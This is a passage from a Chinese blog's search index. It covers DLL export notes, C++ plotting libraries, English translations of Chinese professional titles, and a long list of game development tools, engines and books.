像AFX_EXT_CLASS这样的宏，如果用于DLL应用程序的实现中，则表示输出（因为_AFX_EXT被定义，通常是在编译器的标识参数中指定该选项/D_AFX_EXT）；如果用于使用DLL的应用程序中，则表示输入（_AFX_EXT没有定义）。 要输出整个的类，对类使用_declspec(_DLLexpot)；要输出类的成员函数，则对该函数使用_declspec(_DLLexport)。如： class AFX_EXT_CLASS CTextDoc : public CDocument { … } extern “C” AFX_EXT_API void WINAPI InitMYDLL(); 这几种方法中，最好采用第三种，方便好用；其次是第一种，如果按顺序号输出，调用效率会高些；最次是第二种。 模块定义文件(.DEF) 模块定义文件(.DEF)是一个或多个用于描述DLL属性的模块语句组成的文本文件，每个DEF文件至少必须包含以下模块定义语句： * 第一个语句必须是LIBRARY语句，指出DLL的名字； * EXPORTS语句列出被导出函数的名字；将要输出的函数修饰名罗列在EXPORTS之下，这 个名字必须与定义函数的名字完全一致，如此就得到一个没有任何修饰的函数名了。 * 可以使用DESCRIPTION语句描述DLL的用途(此句可选)； * &quot;;&quot;对一行进行注释(可选)。 DLL程序和调用其输出函数的程序的关系 1、DLL与进程、线程之间的关系 DLL模块被映射到调用它的进程的虚拟地址空间。 DLL使用的内存从调用进程的虚拟地址空间分配，只能被该进程的线程所访问。 DLL的句柄可以被调用进程使用；调用进程的句柄可以被DLL使用。 DLL使用调用进程的栈。 2、关于共享数据段 DLL定义的全局变量可以被调用进程访问；DLL可以访问调用进程的全局数据。使用同一DLL的每一个进程都有自己的DLL全局变量实例。如果多个线程并发访问同一变量，则需要使用同步机制；对一个DLL的变量，如果希望每个使用DLL的线程都有自己的值，则应该使用线程局部存储(TLS，Thread Local Strorage)。 在程序里加入预编译指令，或在开发环境的项目设置里也可以达到设置数据段属性的目的.必须给这些变量赋初值,否则编译器会把没有赋初始值的变量放在一个叫未被初始化的数据段中。","tags":""},{"title":"C++可视化库推荐","url":"/20231225/c-ke-shi-hua-ku-tui-jian/","text":"MathGL MathGL是用于在Linux和Windows下制作高质量科学图形的库；一个用于快速绘制和处理大型数据数组的库；用于在窗口和控制台模式下工作并易于嵌入其他程序的库。MathGL可以绘制各种图形。这包括：一维（图，面积，条，步，茎，圆环，图，误差，管，标记，请参见一维图）；二维绘图（网格，冲浪，密度，连续，连续F，框，轴向，秋天，皮带，平铺，）；三维图（Surf3，Dens3，Cont3，ContF3，类云）；双重数据图：矢量场Vect，流线流动，映射图Map，曲面和等值面，由其他数据SurfA，SurfC，Surf3A，Surf3C透明或着色（即透明度或颜色变化）等等。 root 它提供了处理大数据处理，统计分析，可视化和存储所需的所有功能。它主要用C ++编写，但也可以与其它语言，例如Python和R.集成。 Gnuplot Gnuplot是一个便携式命令行驱动的图形实用程序，适用于Linux，OS / 2，MS Windows，OSX，VMS和许多其他平台.多不同类型的2D和3D图.Gnuplot is a portable command-line driven graphing utility for Linux, OS/2, MS Windows, OSX, VMS, and many other platforms. The source code is copyrighted but freely distributed (i.e., you don’t have to pay for it). It was originally created to allow scientists and students to visualize mathematical functions and data interactively, but has grown to support many non-interactive uses such as web scripting. It is also used as a plotting engine by third-party applications like Octave. Gnuplot has been supported and under active development since 1986. QtChart以及与Qt相关的支持3d效果https://doc.qt.io/qt-5/qtdatavisualization-index.html qwt基于Qt的图表类工具Qwt User’s Guide: Qwt - Qt Widgets for Technical Applications QwtPlot3D ChartDirector ChartDirector广泛的图表类型，跨平台，适用于各种应用程序类型，将图表创建为PDF和SVG以及PNG，JPG，GIF和BMP图像。 VTK vtk是一个3D计算机图形学、图象处理及可视化工具包.支持多语言。VTK is an open-source software system for image processing, 3D graphics, volume rendering and visualization. VTK includes many advanced algorithms (e.g., surface reconstruction, implicit modeling, decimation) and rendering techniques (e.g., hardware-accelerated volume rendering, LOD control).VTK is used by academicians for teaching and research; by government research institutions such as Los Alamos National Lab in the US or CINECA in Italy; and by many commercial firms who use VTK to build or extend products. Reference: C++可视化库推荐","tags":""},{"title":"各系列职称的翻译","url":"/20231225/ge-xi-lie-zhi-cheng-de-fan-yi/","text":"（一）研究系统 研究员[正高] professor , professor +学科 副研究员[副高] associate professor; associate professor of 学科。 助理研究员[中] research associate; 研究实习员[初] research assistant. (二)大学教师系列 教授[正高] professor 副教授[副高] associate professor; associate professor of 学科。 讲师[中] lecturer 助教[初] assistant (三)中等专业学校、技工学校教师系统 高级讲师[副高] senior lecturer; 讲师[中] lecturer; 助理讲师[初] assistant lecturer; 教员[初] teacher; 高级实习指导教师[副高]senior instructor; 一级实习指导教师[中]first-grade instructor; 二级实习指导教师[初]second-grade instructor; 三级实习指导教师[初]third-grade instructor. (四)中学教师系列 中学高级教师[副高] 可译为 senior teacher (secondary school)； 中学一级教师[中]first-grade teacher (secondary school)； 中学二级教师[初]second-grade teacher (secondary school)； 中学三级教师[初]third-grade teacher (secondary school)。 (五)小学教师系列 小学高级教师[中] senior teacher(primary school)； 小学一级教师[初]first-grade teacher(primary school)； 小学二级教师[初] second-grade teacher (primary school); 小学三级教师[初]third-grade teacher (primary school)。 (六)工程技术系列 教授级高级工程师[正高]professor of engineering； 高级工程师[副高]senior engineering或associate professor of engineering； 工程师[中]engineer； 助理工程师[初]assistant engineer； 技术员[初]technician (七)实验系列 高级实验师[高] senior lab master 实验师[中]lab master 助理实验师[初]assistant lab master 实验员[初]laboratory technician。 (八)农业技术系列 高级农艺师[高]senior agronomist 农艺师[中]agronomist； 助理农艺师[初]assistant agronomist； 农业技术员[初]agricultural technician. (九)图书资料系列 研究馆员[正高]professor of library science； 副研究馆员[副高] associate professor of library science; 馆员[中]librarian; 助理馆员[初]library assistant； 管理员[初]clerk。 (十)档案系列 研究馆员[正高]professor of archives science; 副研究馆员[副高]associate professor of archives science; 馆员[中]archivist; 助理馆员[初]assistant archivist； 管理员[初]file clerk (十一)文物博物系列 研究馆员[正高]professor of relics and museology； 副研究馆员[副高]associate professor of relics and museology； 馆员[中] museologist； 助理馆员[初] assistant museologist； 文博管理员[初]conservator。 (十二)卫生技术系列 主任医师[正高]在医科大学讲课的教授，叫professor of medicine,或者professor of medicial science,而主任医师主要在医院工作，为了有所区别，可将“主任医师”译作professor of treatment 或professor + 从事的专长学科（例如：professor of paediatrics[儿科主任医师]，professor of dermatology[皮肤科主任医师]，等等） 副主任医师[副高]associate professor of treatment,或associate professor of +学科。 主治医师[中]可译作doctor-in-charge；如果要表达清楚，则可分别译作surgeon-in-charge[外科主治医师]，oculist-in-charge[眼科主治医师]，pediatrician-in-charge[儿科主治医师]，physician-in-charge[内科主治医师]，gyneco-logist-in-charge [妇科主治医师]， dermatol-ogist-in-charge[皮肤科主治医师]，dentist-in-charge[牙科主治医师]，等等。 医师[初]doctor,或doctor+科别； 医士[初]assistant doctor. 主任药师[正高]professor of pharmacy; 副主任药师[副高]associate professor of pharmacy； 主管药师[中]pharmacist-in-charge; 药师[初]pharmacist； 药士[初]assistant pharmacist。 主任护师[正高]professor of nursing； 副主任护师[副高]associate professor of nursing； 主管护师[中]nurse-in-charge； 护师[初]nurse practitioner； 护士[初]nurse或nurse’s aide。 主任技师[正高]full senior technologist； 副主任技师[副高]associate senior technologist; 主管技师[中]technologist-in-charge； 技师[初]technologist； 技士[初]technician。 (十三)新闻系列 高级编辑[正高] full senior editor； 主任编辑[副高]associate senior editor； 编辑[中]editor； 助理编辑[初]assistant editor。 高级记者[正高]full senior reporter； 主任记者[副高]associate senior reporter； 记者[中]reporter； 助理记者[初]assistant reporter。 (十四)出版系列 编审[正高]full senior editor 副编审[副高]associate senior editor 编辑[中]editor； 助理编辑[初]assistant editor； 技术编辑[中]technical editor； 助理技术编辑[初]assistant technical editor； 技术设计员[初]technical designer； 一级校对[中]first-grade proofreader； 二级校对[初]second-grade proofreader； 三级校对[初]third-grade proofreader。 (十五)翻译系列 译审[正高]full senior translator 副译审[副高]associate senior translator 翻译[中]translator； 助理翻译[初]assistant translator 。 (十六)广播电视播音系列 播音指导[正高]director of announcing； 主任播音员[副高]chief announcer； 一级播音员[中]first-grade announcer； 二级播音员[初]second-grade announcer； 三级播音员[初]third-grade announcer。 (十七)经济系列 高级经济师[高] senior economist； 经济师[中]economist； 助理经济师[初] assistant economist； 经济员[初]economic clerk。 (十八)会计系列 高级会计师[高]senior accountant； 会计师[中]accountant； 助理会计师[初]assistant accountant； 会计员[初]treasurer。 (十九)统计系列 高级统计师[高] senior statistician； 统计师[中]statistician； 助理统计师[初]assistant statistician； 统计员[初]statistical clerk。 (二十)律师系列 一级律师[正高]“律师”，在英美有多种叫法：比较通用的是lawyer；“一级律师”译first-grade lawyer； 二级律师[副高]second-grade lawyer； 三级律师[中]third-grade lawyer； 四级律师[初]fourth-grade lawyer； 律师助理[初]lawyer’s assistant (二十一)公证系列 一级公证员[正高]“公证员”译成notary public(简称NP)或notary都可以，而用NP更正式一些。“一级公证员”可译first-grade notary public； 二级公证员[副高]second-grade notary public； 三级公证员[中]third-grade notary public； 四级公证员[初]fourth-grade notary public； 公证员助理[初]notary’s assistant (二十二)海关系列 高级关务监督[高]senior customs supervisor； 关务监督[中]customs supervisor； 助理关务监督[初]assistant customs supervisor； 关务员[初]customs clerk。 (二十三)航空飞行系列 一级飞行员[高]first-grade pilot； 二级飞行员[中]second-grade pilot； 三级飞行员[初]third-grade pilot； 四级飞行员[初]fourth-grade pilot； 一级领航员[高]first-grade navigator； 二级领航员[中]second-grade navigator； 三级领航员[初]third-grade navigator； 四级领航员[初]fourth-grade navigator； 一级飞行通信员[高]first-grade flight radioman； 二级飞行通信员[中]second-grade flight radioman； 三级飞行通信员[初]third-grade flight radioman； 四级飞行通信员[初]fourth-grade flight radioman； 一级飞行机械员[高]first-grade flight engineer； 二级飞行机械员[中]second-grade flight engineer； 三级飞行机械员[初]third-grade flight engineer； 四级飞行机械员[初]fourth-grade flight engineer。 (二十四)船舶技术系列 高级船长[高]英语里关于“船长”一词有好几个对应词：captain, shipmaster, 拟译为 captain; “高级船长”译作senior captain； 船长[中]captain； 大副[中]译作first mate或mate； 二副[初]second mate； 三副[初]third mate； 高级轮机长[高]senior engineer或senior chief engineer； 轮机长[中]chief或chief engineer； 大管轮[中]first engineman； 二管轮[初]second engineman； 三管轮[初]third engineman； 高级电机员[高]senior electrician； 通用电机员[中]general electrician； 一等电机员[中]first electrician； 二等电机员[初]second electrician； 高级报务员[高]senior radioman； 通用报务员[中]general radioman； 一等报务员[中]first radioman； 二等报务员[初]second radioman； 限用报务员[初]special radioman。 (二十五)体育教练系列 主教练[高]chief coach； 教练[中]coach； 助理教练[初]assistant coach。 (二十六)艺术系列 一级[高]first-grade（如“一级演员”，first-grade actor）； 二级[高]second-grade (如“二级画师”，second-grade painter)； 三级[初]third-grade（如“三级导演”，third-grade director）； 四级[初]fourth-grade (如“四级演员”，fourth-grade actor)。 (二十七)工艺美术系列 高级工艺美术师[高]senior industrial artist； 工艺美术师[中]industrial artist； 助理工艺美术师[初]assistant industrial artist； 工艺美术员[初]painter of handicraft。 (二十八)其它 审计（audit），套用会计系列职称，但“审计员”可译auditor；专利（patent）,套用研究系列职称；法医(forensic medicine)，套用卫生技术系列职称。 Reference: 各系列职称的翻译","tags":""},{"title":"github专题","url":"/20221206/github-zhuan-ti/","text":"","tags":""},{"title":"游戏开发资源GameDevResource","url":"/20220705/you-xi-kai-fa-zi-yuan-gamedevresource/","text":"注意：部分网站可能需要科学上网才能访问 ※目录 目录 美术 new 素材/占位符 new 精灵/帧图编辑工具 位图压缩 材质工具 角色生成器 方块贴图/关卡地图编辑器 动画 矢量图/贴图编辑 模型 地形生成器 体素编辑器 像素画教程 程序 引擎与框架 2D 3D 音频 资源包 音乐/音频编辑器 桌游 推荐 博客与文章链接 书籍 杂志 视频/博客 知乎专栏 Game Jams 完整游戏源码 广告 学习资源 new 通用游戏开发 计算机图形学 其他惊艳清单 由了不起的人为了不起的人而创 美术 程序 音频 桌游 推荐 广告 教程 ※美术 new 卓绝的游戏美术资源和编辑工具，让朴实无华的游戏变得犹如毕加索的艺术创作。 ※素材/占位符 new 2D 卡通风格移动端游戏UI包 卡通风格的用户界面素材包。包含多图层的psd格式文件。 用于 RPG 游戏的 420 像素图标 免费商用授权。 CG材质/CGTextures 材质资源大合集。 GameDev市场 社区驱动的市场，为独立游戏开发者和天赋卓绝的素材设计师建立桥梁。 游戏图标合集/Games-Icons Set 可以免费使用的游戏图标。 图标怪兽/Iconmonstr 另一个免费游戏图标资源站。 开源剪贴画/OpenClipart 免费剪贴画合集。 开源游戏艺术/OpenGameArt 用于免费游戏项目的媒体资源库。 PlainTextures 素材资源网站。 莱纳的瓷砖/Reiner’s Tilesets 一个有关免费2D/3D图形资源的博客。 Sketchfab 发布和嵌入可交互的3D模型。 SpriteLib 精灵(sprites)资源合集。 素材之王/TextureKing 素材资源网站。 树木生成器/Tree Generator 在线生成树木的图形。 Upando 拥有丰富的游戏开发资源的市场。 Vecteezy 免费矢量艺术。 Yobi3D 免费3D模型搜索引擎。 开源字体库 开源字体库。 cg-trader free models 3D 模型库，可用于 CG 设计和其他艺术作品，包含超过 150000 个免费的 3D 模型。 [精灵资源收集](http: //www.spriters-resource.com/) 按机种和来源分类的精灵资源收集，也包括一些用户上传内容。使用时注意版权许可，可以用作美术参考。 ※精灵/帧图编辑工具 Aseprite 用于精灵动图和像素画编辑的工具。 GraphicsGale 便于使用的动画编辑工具。 PiskelApp 免费的在线像素画/帧图编辑工具。 PyxelEdit 以使用乐趣和便于创作方格贴图，关卡地图和动画为设计宗旨的像素画编辑器。 ShoeBox ShoeBox 是一款以 Adobe Air 为基础的免费应用，用于在 windows 或者 Max OSX 平台上创作游戏和 UI 相关的资源。 Spritesheet Preview 一个使用简单的预览精灵图的免费工具。 TexturePacker 卓绝的帧图编辑器。 BigShear 基于Adobe Air的纹理分割合并小工具，国人出品。 ※位图压缩 ImageAlpha 图片压缩程序 pngqunt 和其他几个工具的 Mac OSX 平台图形界面前端。 Kraken.io 使用顶级算法，健壮，闪速的图片优化与压缩程序。 PNGGauntlet 为加快站点速度压缩图片。 PNGoo 带批处理功能的 pngqunt 程序 Windows 平台图形界面前端。 Pngyu 简单的 PNG 图片压缩工具, 同样使用 pngqunt 作为压缩引擎，拥有 window 和 Mac OXS 版本。 SuperPNG Photoshop plug-in 拥有 Mac 和 Windows 版本. 为优化网页压缩图片。 TinyPNG 高级 png 格式图片无损压缩软件，能够保留 alpha 通道。 Image Compressor Websiteplanet提供的位图压缩工具，性能强大，能够保留 alpha 通道。 ※材质工具 FilterForge 用于自定义滤镜的 Photoshop 插件。 PixPlant 智能 3D 材质工具，能够创建出高质量的法线贴图，置换贴图和高光贴图，还能够利用照片无缝生产材质。 STG 一个能够利用照片快捷而轻松地创建出专业的无缝网格材质的工具。 ※角色生成器 Charas Charas 是一款用于 RPG Maker 的角色生成器。 Famistu Chibi Maker 一款生成二头身游戏角色的在线工具。 Loose Leaf 一款生成二头身游戏角色的在线工具。 ※方块贴图/关卡地图编辑器 ArrayPainter Array Painter 是一款能够以最轻松快捷的方式创建用于游戏地图数据的2维数组的工具软件。 AutoTileGen AutoTileGen 是一款为 2D 游戏地形自动生产方块贴图的工具软件。 OGMO Editor 通用关卡编辑器。 Overlap2D 开源的 2D 关卡与 UI 编辑软件，号称除去写代码外唯一需要用到的 2D 游戏开发工具。 Mappy 免费的网格地图编辑器。 Tiled 免费，简单，灵活的网格地图编辑器。 ※动画 Fusion Character Animator 为 Clickteam Fusion 2.5 引擎开发的小型工具，可以供开发者用来设计 2D 角色精灵图的动画。 Spine Spine 专注于 2D 骨骼动画技术，不仅提供高效的动画创作工作流，还允许你方便地将其集成进游戏之中。 Spriter 编辑精灵动画的现代工具。 DragonBones 开源的 2D 骨骼动画软件，可以用于 flash 游戏和 html5 游戏，得到过 Adobe 的开发支持，现在为国产游戏引擎 egret 的工具包套装中的一员。 LWF 轻量级版本的 SWF. LWF 能够播放从 HTML5, Unity, Cocos2d-x, iOS UIKit 等引擎/框架中提取的 flash 动画。 ※矢量图/贴图编辑 Gimp 即 GNU 图像处理程序。用于照片修润，图像绘制和处理的自由软件。 Inkscape 开源矢量图编辑软件，功能类似 Adobe Illustrator，Corel Draw，Freehand 或 Xara X。 Krita Krita 是一款 Linux KDE 桌面环境下的程序，用于绘制草图和插画，允许设计师完成完整的数字图像创作流程。 Ormr Ormr 是一款高性能，轻量级，跨平台的程序化图形处理软件，允许你基于图层精细调整所有执行过的操作。 Paint.NET Paint.NET 是 Windows 平台上一款免费的图像照片编辑器。 Pickle 另一款像素画软件。 Pixelmator Mac OSX 平台上功能全面的图形编辑应用。 Pixen Mac OSX 平台上的开源像素画软件。 Canva 免费的在线图片编辑工具，无需 app 和额外插件，能够在网页中快速地为照片添加滤镜效果，缩放和编辑图片内容。 ※模型 Blender - 开源的 3D 模型/影像 处理软件，也包含内嵌的游戏引擎。 MakeHuman - 一款开源的人体模型制作软件。 sculptris - 3D 模型雕刻。 Maya - 著名 3D 模型软件。 3ds Max - 著名 3D 模型软件。 Clara.io 在线 3D 模型编辑器。 ※地形生成器 Artifex Terra Windows 平台下一款 3D 地形编辑软件。 Canyon Terrain Editor Windows 平台下的一款 3D 地形编辑软件，允许用户直观高效地创建与编辑拟真高质的 3D 地形文件。 Nem TG 一款功能全面丰富的免费 3D 地形编辑器。 World Machine 支持 Unity，Unreal 等引擎，功能强大丰富的 3D 地形编辑软件。 ※体素编辑器 MagicaVoxel 一款功能全面，界面美观的体素模型编辑器。 Q-Block 来自日本的在线体素编辑器。 Sproxel 一款跨平台的体素编辑器。 VoxelShop 一款风格可爱的体素编辑器。 ※像素画教程 Pixel Art Tutorial (by Derek Yu) 像素画教程 HD Index Painting in Photoshop (by Dan Fessler) 在PS中绘制高清索引图 作者主页 文章版直通车 视频版直通车 No Bullshit Pixel Art Tutorial (by Retronator) 绝不扯淡像素画教程 Pixel Art Knowledge (by various Pixel Artists) 像素画教程大合集 Pixel Art Tutorial (by Cure) 像素画教程 Pixel Art Tutorial (by Android Arts) 像素画教程 Pixel Purism: Process vs Results (by Dan Fessler) 像素画教程 Pixelation Knowledge Repository (by Helm) 像素艺术知识库 6 Pixel Art Drawing Techniques as Video (by GDQuest) 像素画六大技法视频版 What the Heck is Pixel Art (by Pix3M) 像素画到底是什么 Pixel Art Process - or 8 steps to a polished result (by Cyangmou) 像素画处理（8步美化像素画） Perfect Pixel Art with Specular and Bump Lighting in Unity (by Anton Kudin) 在 Unity 中运用镜面光与凹凸贴图创建完美像素画 ISOmetric Pixel Art Cheat Sheet (by Dennis Busch) 等轴立体像素画技法小抄 How To Pixel Art Tutorial as Video (by Christopher Yabsley) 如何绘制像素画视频版 Pyxel Edit Tutorial Mini Series as Video (by Christopher Yabsley) 像素画编辑小教程视频版 GIMP Pixel Art Tool Setup Tutorial as Video (by Retronator) GIMP 像素工具设置教程视频版 Run Cycle Tutorial (by Glauber Kotaki) 像素画多帧循环教程 Pixel Art Tutorials (by finalbossblues) 像素画教程 A Little Guide to Pixel Art (by Simon Hunter) 像素画迷你指南 Secret Weapons and Tactics for Better Pixel Art (by 2D Will Never Die) 精进像素艺术的神器秘籍 Pixel Art Tutorials (by drbubu) 像素画教程 Pixel Art Tutorial (by Studio Purloux) 像素画教程 Pixel Art Academy (by Retronator) 像素画学院 ※程序 游戏框架，引擎和平台合集 ※引擎与框架 ※2D Agen 使用 lua 开发 2D 游戏的跨平台框架，兼容 iOS, Mac 和 Windows 设备。 Allegro 跨平台的开源游戏程序库，主要面向 C/C++ 开发者。 AndEngine 2D 安卓游戏引擎。 Bacon2D 方便的 2D 游戏开发框架，提供了多数游戏需要的表现基本游戏实体的实用 QML 元素。 Box2D 2D 游戏物理引擎。 Chipmunk C# Chipmunk2D 库的 C# 引入。 Chipmunk2D 快速，轻量级的 2D 游戏物理库。 Cocos2D 游戏与多媒体图形库，面向 python 语言。 Cocos2d-x C++ OpenGL 2D/3D 引擎。主要使用 C++ 作为开发语言，但也可用使用 JavaScript 或者 Lua。面向所有主流的移动端/桌面操作系统。包含工具套件 CocoStudio 和 Cocos Code IDE。 Construct 2 面向初学者的 HTML5 游戏制作器，“制作器”意味着你无需编写 JS 代码，你可以使用 Actions（行动），event（事件）和 conditon（条件） 来避开那些“艰难”的部分完成游戏设计 。 Coquette 使用 JavaScript 作为开发语言的微型框架，能够处理碰撞检测，游戏更新循环，画布渲染，键盘和鼠标输入事件。 Corona SDK 面向 iOS 和 安卓 的移动端应用开发套件。 Duality C# / OpenGL 2D 游戏引擎，包含一个可视编辑器工具。 Ejecta 面向 iOS 的快速，开源的 HTML5 开发套件（JS，画布和视频）。 EnchantJS 用于游戏和应用开发的简易 JavaScript 框架。 EndGate 用于开发 HTML5 游戏的 TypeScript 框架。 ENGi 使用 Go 语言的多平台 2D 游戏库。 Farseer 实时物理响应的碰撞检测系统。 FlashPunk 为开发 2D Flash 游戏设计的免费 ActionScript 3 库。 Flixel 使用 ActionScript3 的开源游戏制作工具。 GameMaker GameMakeer 为视频游戏开发既提供了一套拖拽工具，又提供了名为 GML 的内嵌脚本语言用于开发仅使用拖拽工具难以完成的更高级的游戏设计。 GameSalad Mac 和 Windows 平台上的游戏制作引擎。 Gideros 使用 lua 语言开发面向 iOS 和安卓平台的移动端应用游戏的跨平台框架。 HaxeFlixel 让跨平台游戏开发更加轻松的免费工具。 iio.js 为 HTML5 画布应用的开发和部署加速的 JavaScript 库。 ImpactJS JavaScript 游戏引擎，可以用于为桌面/移动浏览器开发酷炫的 HTML5 游戏。 Jitter C# 编写的高性能轻量级物理引擎。 Juno 使用 lua 编写的 2D 像素游戏开发框架。 Kivy 跨平台 python 框架，用于开发支持 Linux，Windows，OS X，Android 和 iOS 设备的应用。 Kivent 用于 Kivy 的 2D 游戏框架。 KiwiJS 友好有趣的开源 HTML5 游戏引擎，人称 HTML5 游戏引擎中的 WordPress。 LibGDX 强大的 Java 图形库，完全免费，只需要编写一次代码就能够将游戏运行在桌面端，安卓端，网页端和 iOS 端等多个平台。 LimeJS HTML5 游戏框架，用于为现代触屏设备开发高性能，接近桌面应用体验的游戏。 Loom SDK 一款开源的移动端 2D 应用/游戏开发框架，使用类似 ASS/JS/C# 的脚本语言，能够实时重载代码与素材文件，拥有强大的 2D 渲染引擎和 UI 框架。 Lums 一款用 C++11 编写的 2D/3D 游戏框架，非常高效与先进，仍处于活跃开发之中。 Lycheejs JavaScript 游戏库，能够为运行在浏览器中的 HTML5 画布游戏，WebGL 游戏和 OPenGL 游戏以及本地环境下运行的游戏提供完整的原型及部署方案。 LÖVE Lua 2D 游戏引擎。 Matter.js 用于网页的 2D 物理引擎。 MINX 使用 C++ 编写的开发风格类似 XNA 的开源 2D 游戏框架。 MOAI 面向专业游戏开发者的跨平台框架，使用 C++，OpenGL 和 Lua 脚本开发 iOS，Android，Windows，Linux，Chrome 和 OSX 平台上的游戏。 MelonJS 开源轻量级 HTML5 游戏引擎。 Monkey X 跨平台编程语言和交叉编译器，以高性能游戏编程为目标。 Monogame Microsoft XNA 4 框架的开源版本。 NodeBox 用于创意设计的一系列 Python 工具。 OpenRA OpenRA 是一款免费的 RTS 游戏引擎。 p2.js JavaScript 2D 物理引擎。 PandaJS 开源的 HTML5 引擎。 Phaser 免费高效的 2D 游戏框架，用于为桌面环境与现代网页浏览器开发 HTML5 游戏，支持画布与 WebGL 渲染。 PICO–8 制作，分享小游戏的在线引擎。 PixiJS HTML5 游戏渲染引擎 - 于 2013 年初首次发布，能够用于 WebGL 以取得较高的性能。如果不支持 WebGL，也能用于普通的 HTML 画布。 Processing 一门面向艺术家，设计师和研究人员的编程语言和开发环境，用于视觉设计。 PyGame Python 的 2D 游戏引擎。 PuzzleScript 开源的 HTML5 解密游戏引擎。 QICI 基于网页，用于开发 HTML5 游戏的高效工具。 Ren’Py 一款开源的使用 Python 语言简化版的视觉小说开发引擎。支持 Windows，Mac OS X，Linux，安卓与 iOS 平台。 Rpgboss 2D 角色扮演游戏引擎与编辑器，基于 Scale 和 libgdx，使用简单，无需编程知识。 RPGMaker 角色扮演游戏开发套件，老版本使用 ruby 作为脚本语言，新版本则使用 JS 进行开发。 SDL SDL 是一款跨平台的编程库，能够通过 OPenGL 和 DirectX 对音频播放，键盘，鼠标，手柄摇杆，显卡等硬件设备进行底层访问。 SFML 简单高效的多媒体库。 SpriteKit iOS/Mac 2D 游戏引擎。 Stage.js 轻量级、高效的 2D HTML5 游戏渲染和布局引擎。用于跨平台的游戏开发。 Starling GPU 加速的 2D Flash API。 Stencyl 用于在移动端，桌面端和网页端开发 2D 视频游戏的游戏创作平台。 Twine 可下载或基于浏览器使用的游戏开发平台，能够创建和编辑剧情线路。不仅支持文本，该工具还支持在剧情线路图中加入音效、音乐和图片。通过它来完成文字冒险游戏只需要掌握非常少的编程知识。 XNA 微软游戏开发框架。 ※3D Azul3D Go 语言编写的 3D 引擎。 Blitz3D 用于快速开发 3D 游戏的类 basic 编程语言。 Bullet 实时物理效果模拟。 bgfx 跨平台的图像渲染库，支持多种后端和多种开发语言。 Cinder 使用 C++ 编写的社区驱动的自由开源库，用于创作专业级质量的创意作品。 Dash 使用 D 语言编写的免费开源 3D 游戏引擎。 gameplay 使用 C++ 编写的免费开源跨平台游戏框架，可以用于开发 2D/3D 游戏。主要的目标群体四开发桌面和移动端游戏的独立开发者。 Godot 拥有丰富的 API 的开源游戏引擎。 Havok Vision 跨平台的游戏引擎，提供了强大而丰富的扩平台运行时技术。 Haxor 将 Haxe 语言与 HTML5+Web?GL 相结合的引擎，帮助你开发出能够运行在现代浏览器上的强大应用。 Hive3D 能够实时协作开发的 3D 游戏引擎。 Horde3D 小型的开源 3D 渲染引擎。 Irrlicht 使用 C++ 编写的开源高性能实时 3D 引擎。 JPCT 面向桌面 Java 和谷歌安卓的 3D 引擎。 Lumberyard 基于寒霜引擎的免费 3A 级游戏引擎，集成 AWS 服务与 Twitch 直播。 ODE 开源的高性能库，用于模拟刚体动力学。 Ogre3D C++ 编写的面向场景，实时，灵活的 3D 渲染引擎（也用于游戏引擎）。 Panda3D 支持 python 和 C++ 编程 的 3D 渲染和游戏开发框架。 Paradox 开源 C# 游戏引擎。 Piston 使用 Rust 编写的模块化开源游戏引擎。官网范例中包含一个有趣的 Minecraft 复刻。 PlayCanvas 基于 WebGL 的游戏引擎。 Polycode 使用 C++（或者内嵌的 lua 脚本）来开发游戏的开源框架。 Spring 强大免费的跨平台 RTS 游戏引擎。 Rajawali 面向安卓平台的 OpenGL ES 2.0/3.0 引擎。 Three.js Javascript 3D 库。 Turbulenz 开源的 HTML5 游戏引擎。 Unreal Engine 4 由 Epic Games 开发的新一代游戏引擎。 Unity 3D 用于创作 2D/3D 游戏和交互内容的开发引擎。 Urho3D 跨平台的渲染/游戏引擎。 Wave C# 编写的跨平台引擎。 jMonkeyEngine 3 为勇于尝试的 Java 开发者推出的 3D 开源引擎。 voxel.js voxel.js 提供了一系列工具，能够用于快速开发运行在浏览器中的类似 Minecraft 的 3D 像素游戏。 ※音频 音频编辑器，声音资源包及其他 ※资源包 Freesound - 以 CC 权限开源的音频文件大合集。 Musopen - 免费的古典音乐。 Octave - 免费的 UI 音效库。 PacDV - 免费的古典音乐合集。 SoundBible.com - 以多种证书权限开源的音频/音效库。 LaptopNoise - 随机电脑故障音效大合集，可以免费使用。 SoundImage - 艺术家 Eric Matyas 的游戏音乐作品合集，只须声明游戏版权并提供站点链接就能够免费使用所有资源。 ※音乐/音频编辑器 Audacity 开源跨平台的音频录制/编辑软件。 Audiosauna 灵活高效，运行在浏览器中的音乐工作站。 Audiotool 在线音乐编辑器。 Bfxr 用于为电脑游戏制作 8-bit 音效。 FamiTracker 免费的 Windos 音轨编辑器，用于为 NES/Famicom 系统制作音乐. MadTracker 强大高效的音乐制作软件，全面支持 VST™, ASIO™ 和 ReWire™ 从而保证了其良好的通用性与兼容性。 Sekaiju 开源的 MIDI 合声器。 Soundation 在线使用的专业级音乐编辑器。 iNudge 在线制作音效。 jfxr Bfxr 音效生成器的 JS 移植版。 musagi 一款开源的音乐编辑合成软件，相当复杂与庞大。 ExplodoMatica 爆炸音效生成器(作者没有提供可执行版本，需要自己编译，可能更适合 linux 或 mac 用户)。 JExplodoMatica 爆炸音效生成器的 java 移植版。 ※桌游 桌游制作工具 Boardgamizer 桌游设计创意生成器。 RPTools 旨在强化桌上角色扮演游戏体验的开源工具合集。 ※推荐 博客，文章链接，杂志和其他 ※博客与文章链接 Amit’s Game Programming BigSushi Designer Notes Emanuele Feronato’s Blog Extraguy Gamasutra Game Development on StackExchange GameDev GameDevs.org GameJolt GameMarketeers Greenlit Gaming HTML5 Game Devs Forum HobbyGameDev Html5 Game Development IndieDB Indius Java Gaming Lost Garden Polygon Real-Time Rendering Superlevel TIGSource TruePCGaming WhatGamesAre iforce2d indiegames indievault ※书籍 游戏开发相关书籍推荐，本文的中文版翻译中附加了书籍对应的豆瓣链接 为方便浏览也可以查看这个豆列 Artificial Intelligence for Games 《游戏AI》 豆瓣链接 Flow 《心流》 豆瓣链接 中文版豆瓣链接 Game Coding Complete 《游戏代码全接触》 豆瓣链接 中文版豆瓣链接 Game Development Essentials: Game Level Design 《游戏开发精髓：游戏关卡设计》 豆瓣链接 Game Engine Architecture 《游戏引擎架构》 豆瓣链接 中文版豆瓣链接 Game Mechanics: Advanced Game Design 《游戏机制：高级游戏设计》 豆瓣链接 中文版豆瓣链接 Game Programming Gems 《游戏编程瑰宝丛书》 豆列链接 Game Programming Patterns 《游戏编程模式》 豆瓣链接 Game Scripting Mastery 《精通游戏脚本》 豆瓣链接 中文版豆瓣链接 Interactive Computer Graphics: A Top-Down Approach with Shader-Based OpenGL, 6/E 《交互式计算机图形学：基于 OpenGL 着色器的自顶向下方法（第六版）》 豆瓣链接 